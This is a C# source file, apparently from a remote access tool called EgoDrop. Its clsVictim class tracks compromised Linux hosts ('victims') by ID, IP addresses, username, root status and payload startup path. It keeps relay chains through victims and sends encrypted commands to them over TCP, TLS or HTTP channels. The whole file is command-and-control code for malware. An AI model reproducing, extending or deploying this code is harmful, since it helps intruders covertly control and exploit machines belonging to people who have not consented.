using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.Intrinsics.Arm;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    public class clsVictim
    {
        /// <summary>
        /// Victim config.
        /// </summary>
        public struct stVictimConfig
        {
            public Image imgScreen;                           //Linux screenshot.
            public string szID;                               //Victim ID.
            public string szIpAddrInternal;                   //Remote internal IPv4 address.
            public string szIpAddrExternal;                   //Remote external IPv4 address.
            public uint nUid;                                 //Linux uid.
            public string szUsername;                         //Linux username.
            public bool bIsRoot { get { return nUid == 0; } } //Is root
            public string szFilePath;                         //Payload startup file path.
        }

        public Dictionary<string, List<string>> m_dicVictimChain = new Dictionary<string, List<string>>();

        public Socket m_sktClnt           { get; set; }       //Socket object.
        public SslStream m_sslClnt        { get; set; }       //SSL object.
        public NetworkStream m_streamClnt { get; set; }       //Networkstream object.

        public clsHttpPkt m_httpPkt       { get; set; }       //HTTP packet handler.

        public byte[] m_abBuffer = new byte[65535];           //Buffer.

        public clsCrypto m_crypto         { get; set; }       //Crypto object.
        public clsListener m_listener     { get; set; }       //Listener object.

        /// <summary>
        /// Overload(Ordinary RSA + AES communication).
        /// </summary>
        /// <param name="sktClnt">Client socket object.</param>
        /// <param name="listener">Server listener object.</param>
        public clsVictim(Socket sktClnt, clsListener listener)
        {
            m_sktClnt  = sktClnt;
            m_listener = listener;

            m_crypto   = new clsCrypto(true);
        }
        
        /// <summary>
        /// Overload(SSL communication).
        /// </summary>
        /// <param name="sktClnt">Client socket object.</param>
        /// <param name="sslstream">Client SSL stream.</param>
        /// <param name="listener">Server listener object.</param>
        public clsVictim(Socket sktClnt, SslStream sslstream, clsListener listener)
        {
            m_sktClnt  = sktClnt;
            m_sslClnt  = sslstream;
            m_listener = listener;
        }

        /// <summary>
        /// Overload(HTTP communication).
        /// </summary>
        /// <param name="sktClnt">Client socket object.</param>
        /// <param name="streamClnt">Client network stream object.</param>
        /// <param name="httpPkt">HTTP packet handler.</param>
        /// <param name="listener">Server listener object.</param>
        public clsVictim(Socket sktClnt, NetworkStream streamClnt, clsHttpPkt httpPkt, clsListener listener)
        {
            m_sktClnt    = sktClnt;
            m_streamClnt = streamClnt;
            m_httpPkt    = httpPkt;
            m_listener   = listener;

            m_crypto     = new clsCrypto(true);
        }

        #region VictimChain

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szVictimID"></param>
        /// <param name="lsChain"></param>
        public void fnAddVictimChain(string szVictimID, List<string> lsChain)
        {
            if (!m_dicVictimChain.ContainsKey(szVictimID))
            {
                m_dicVictimChain.Add(szVictimID, lsChain);
            }
            else
            {
                MessageBox.Show("Exists chain: " + szVictimID + "\nThe original chain will be replaced.", "fnAddVictimChain()", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                m_dicVictimChain.Remove(szVictimID);
                m_dicVictimChain.Add(szVictimID, lsChain);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szVictimID"></param>
        /// <returns></returns>
        public List<string> fnGetVictimChain(string szVictimID)
        {
            if (m_dicVictimChain.ContainsKey(szVictimID))
                return m_dicVictimChain[szVictimID];
            else
                return new List<string>();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szVictimID"></param>
        public void fnDeleteVictimChain(string szVictimID)
        {
            if (m_dicVictimChain.ContainsKey(szVictimID))
                m_dicVictimChain.Remove(szVictimID);
            else
                MessageBox.Show("Cannot find chain: " + szVictimID);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public List<string> fnlsGetVictims()
        {
            return m_dicVictimChain.Keys.ToList();
        }

        #endregion

        /// <summary>
        /// Send data.
        /// </summary>
        /// <param name="nCommand">Command.</param>
        /// <param name="nParam">Parameter</param>
        /// <param name="szMsg">Message string.</param>
        public void fnSend(uint nCommand, uint nParam, string szMsg) => fnSend(nCommand, nParam, Encoding.UTF8.GetBytes(szMsg));
        
        /// <summary>
        /// Send data.
        /// </summary>
        /// <param name="nCommand">Command.</param>
        /// <param name="nParam">Parameter.</param>
        /// <param name="abMsg">Message byte.</param>
        public void fnSend(uint nCommand, uint nParam, byte[] abMsg) => fnSendRaw(new clsEDP((byte)nCommand, (byte)nParam, abMsg).fnabGetBytes());
        
        /// <summary>
        /// Send data.
        /// </summary>
        /// <param name="abBuffer">Message buffer.</param>
        public void fnSendRaw(byte[] abBuffer)
        {
            m_sktClnt.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sktClnt.EndSend(ar);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }), abBuffer);
        }

        /// <summary>
        /// Send data with specified Command and Parameter. The significant parts are Command and Parameter.
        /// </summary>
        /// <param name="nCmd">Command.</param>
        /// <param name="nParam">Parameter.</param>
        public void fnSendCmdParam(uint nCmd, uint nParam, int nLength = 10)
        {
            clsEDP edp = new clsEDP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(clsEZData.fnGenerateRandomStr(nLength)));
            switch (m_listener.m_stListener.protoListener)
            {
                case clsSqlite.enListenerProtocol.TCP:
                    fnSendRaw(edp.fnabGetBytes());
                    break;
                case clsSqlite.enListenerProtocol.HTTP:
                    fnHttpSend(nCmd, nParam, clsEZData.fnGenerateRandomStr());
                    break;
                case clsSqlite.enListenerProtocol.DNS:

                    break;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szMsg"></param>
        public void fnSendCommand(string szMsg) => fnSendCommand(szMsg.Split('|').ToList());

        public void fnSendCommand(string szVictimID, string szMsg) => fnSendCommand(szVictimID, szMsg.Split('|').ToList());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="aMsg"></param>
        public void fnSendCommand(string[] aMsg) => fnSendCommand(aMsg.ToList());

        public void fnSendCommand(string szVictimID, string[] aMsg) => fnSendCommand(szVictimID, aMsg.ToList());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="lsMsg"></param>
        public void fnSendCommand(List<string> lsMsg)
        {
            lsMsg = lsMsg.Select(x => clsEZData.fnStrE2B64(x)).ToList();
            string szMsg = string.Join("|", lsMsg);
            byte[] abBuffer = { };
            
            switch (m_listener.m_stListener.protoListener)
            {
                case clsSqlite.enListenerProtocol.TCP:
                    abBuffer = m_crypto.fnabAESEncrypt(szMsg);
                    fnSend(2, 0, abBuffer);
                    break;
                case clsSqlite.enListenerProtocol.TLS:
                    abBuffer = Encoding.UTF8.GetBytes(szMsg);
                    fnSslSend(abBuffer);
                    break;
                case clsSqlite.enListenerProtocol.DNS:

                    break;
                case clsSqlite.enListenerProtocol.HTTP:
                    abBuffer = m_crypto.fnabAESEncrypt(szMsg);
                    fnHttpSend(2, 0, abBuffer);
                    break;
            }
        }

        public void fnSendCommand(string szVictimID, List<string> lsMsg)
        {
            List<string> lsVictim = m_dicVictimChain[szVictimID];
            lsMsg = lsVictim.Concat(lsMsg).ToList();

            fnSendCommand(lsMsg);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="szMsg"></param>
        public void fnSslSend(string szMsg) => fnSslSend(szMsg.Split('|').ToList());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="aMsg"></param>
        public void fnSslSend(string[] aMsg) => fnSslSend(aMsg.ToList());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="abBuffer"></param>
        public void fnSslSend(byte[] abBuffer) => fnSslSendRAW(new clsEDP(0, 0, abBuffer).fnabGetBytes());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="lsMsg"></param>
        public void fnSslSend(List<string> lsMsg)
        {
            lsMsg = clsEZData.fnLsE2B64(lsMsg);
            string szMsg = string.Join("|", lsMsg);
            byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);

            clsEDP edp = new clsEDP(0, 0, abMsg);
            byte[] abBuffer = edp.fnabGetBytes();

            fnSslSendRAW(abBuffer);
        }
        public void fnSslSendRAW(byte[] abBuffer)
        {
            m_sslClnt.BeginWrite(abBuffer, 0, abBuffer.Length, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sslClnt.EndWrite(ar);
                }
                catch (Exception ex)
                {

                }
            }), abBuffer);
        }

        /// <summary>
        /// Send HTTP packet(response).
        /// </summary>
        /// <param name="nCommand"></param>
        /// <param name="nParam"></param>
        /// <param name="szBody"></param>
        public void fnHttpSend(uint nCommand, uint nParam, string szBody) => fnHttpSend(nCommand, nParam, Encoding.UTF8.GetBytes(szBody));
        
        /// <summary>
        /// Send HTTP packet(response).
        /// </summary>
        /// <param name="nCommand"></param>
        /// <param name="nParam"></param>
        /// <param name="abBody"></param>
        public void fnHttpSend(uint nCommand, uint nParam, byte[] abBody)
        {
            clsEDP edp = new clsEDP((byte)nCommand, (byte)nParam, abBody);
            string szMsg = Convert.ToBase64String(edp.fnabGetBytes());

            byte[] abResp = m_httpPkt.fnabGetPacket(szMsg);
            fnHttpSendRAW(abResp);
        }

        /// <summary>
        /// Send HTTP packet.
        /// </summary>
        /// <param name="abResp"></param>
        public void fnHttpSendRAW(byte[] abResp)
        {
            m_streamClnt.BeginWrite(abResp, 0, abResp.Length, new AsyncCallback((ar) =>
            {
                try
                {
                    m_streamClnt.EndWrite(ar);
                }
                catch (Exception ex)
                {

                }
            }), abResp);
        }
    }
}
